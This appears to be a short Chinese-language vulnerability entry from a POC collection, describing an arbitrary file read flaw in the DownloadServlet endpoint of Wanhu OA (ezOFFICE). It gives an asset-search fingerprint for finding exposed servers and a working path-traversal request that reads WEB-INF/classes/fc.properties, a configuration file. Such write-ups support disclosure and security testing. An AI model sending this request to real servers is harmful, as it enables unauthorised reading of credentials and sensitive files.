# 万户OA DownloadServlet 任意文件读取漏洞

## 漏洞描述

万户OA DownloadServlet接口存在任意文件读取漏洞，攻击者通过漏洞可以读取服务器中的敏感文件，获取敏感信息

## 漏洞影响

<a-checkbox checked>万户OA</a-checkbox></br>

## 网络测绘

<a-checkbox checked>app="万户网络-ezOFFICE"</a-checkbox></br>

## 漏洞复现

产品页面

![img](../../../.vuepress/public/img/1631323798806-958050db-05f6-47ca-95b4-74487ee67a66-2354324.png)

验证POC

```html
/defaultroot/DownloadServlet?modeType=0&key=x&path=..&FileName=WEB-INF/classes/fc.properties&name=x&encrypt=x&cd=&downloadAll=2 
```

![img](../../../.vuepress/public/img/1662082139955-1b99e2cd-bba3-4bba-9684-84b068a5c17a.png)